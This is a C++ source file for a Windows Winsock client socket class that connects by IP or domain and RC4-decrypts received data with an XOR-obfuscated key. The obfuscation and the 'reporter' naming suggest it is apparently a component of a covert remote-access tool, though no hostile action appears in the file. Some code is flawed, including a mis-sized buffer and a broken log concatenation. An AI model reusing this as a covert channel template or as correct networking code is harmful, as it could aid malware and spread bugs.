#include "csocket.hpp"

csocket::Socket::Socket(std::string DM, std::string IP, int Port)
{
    this->DM = DM;
    this->IP = IP;
    this->Port = Port;
}

csocket::Socket::Socket(std::string IP, int Port)
{
    this->DM = "";
    this->IP = IP;
    this->Port = Port;
}

SOCKET csocket::Socket::Init()
{
    WSAData wsadata;
    if (WSAStartup(MAKEWORD(2, 2), &wsadata) != 0)
        return -1;
    SOCKET thisSock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (thisSock == INVALID_SOCKET)
    {
        WSACleanup();
        return -1;
    }
    this->sock_fd = thisSock;
    return thisSock;
}

int csocket::Socket::Connect()
{

#ifdef IP_ADDR_MODE
    /**
     * In ip mode
     */
    sockaddr_in hint;
    memset(&hint, 0, sizeof(hint));
    hint.sin_family = AF_INET;
    hint.sin_port = htons(this->Port);
    inet_pton(AF_INET, this->IP.c_str(), &hint.sin_addr);

    int connRes = connect(this->sock_fd, (sockaddr *)&hint, sizeof(hint));
    if (connRes == SOCKET_ERROR)
    {
#ifdef REPORTER_DEBUG_MODE
        writeLog("Fail to connect to server ... ", StandardLogPath, "Fail");
        writeLog("WSA_Last_Error: " + WSAGetLastError(), StandardLogPath, "Fail");
#endif
        closesocket(this->sock_fd);
        WSACleanup();
        return -1;
    }
    return connRes;
#endif
#ifdef DOMAIN_NAME_MODE
    /**
     * In domain mode
     */
    addrinfo hint, *serverInfos;
    memset(&hint, 0, sizeof(hint));
    hint.ai_family = AF_INET;
    hint.ai_socktype = SOCK_STREAM;
    hint.ai_protocol = IPPROTO_TCP;

    if (getaddrinfo(this->DM.c_str(), "http", &hint, &serverInfos) != 0)
    {
#ifdef REPORTER_DEBUG_MODE
        writeLog("Fail to get server info ... ", StandardLogPath, "Fail");
        writeLog("WSA_Last_Error: " + WSAGetLastError(), StandardLogPath, "Fail");
#endif
        closesocket(this->sock_fd);
        WSACleanup();
        return -1;
    }

    sockaddr_in serverAddr;
    memcpy(&serverAddr, serverInfos->ai_addr, serverInfos->ai_addrlen);
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_port = htons(this->Port);

    int connRes = connect(this->sock_fd, (sockaddr *)&serverAddr, sizeof(serverAddr));
    if (connRes == SOCKET_ERROR)
    {
#ifdef REPORTER_DEBUG_MODE
        writeLog("Fail to connect to server ... ", StandardLogPath, "Fail");
        writeLog("WSA_Last_Error: " + WSAGetLastError(), StandardLogPath, "Fail");
#endif
        closesocket(this->sock_fd);
        WSACleanup();
        return -1;
    }

#endif
    return 0;
}

int csocket::Socket::Recv(std::string *data)
{
    // key of rc4
    char* ckey = INET_KEY;
    unxor(ckey);
    std::string key(ckey);
    
    char buf[SO_RCVBUF] = {0};
    int recvLen = recv(this->sock_fd, buf, SO_RCVBUF, 0);

    if (recvLen == SOCKET_ERROR)
    {
#ifdef REPORTER_DEBUG_MODE
        writeLog("Fail to recv ... ", StandardLogPath, "Fail");
        writeLog("WSA_Last_Error: " + WSAGetLastError(), StandardLogPath, "Fail");
#endif
        closesocket(this->sock_fd);
        WSACleanup();
        return -1;
    }

    // Decrypt datas
    std::string cdata(buf);
    std::vector<int> S(256);
    std::vector<int> T(256);

    for(int i=0; i<256; i++){
        S[i] = i;
    	T[i] = key[(i % key.length())];
    }

    S = permute(S, T);
    *data = rc4(S, cdata);

    return 0;
}

void csocket::Socket::Close()
{
    closesocket(this->sock_fd);
    WSACleanup();
}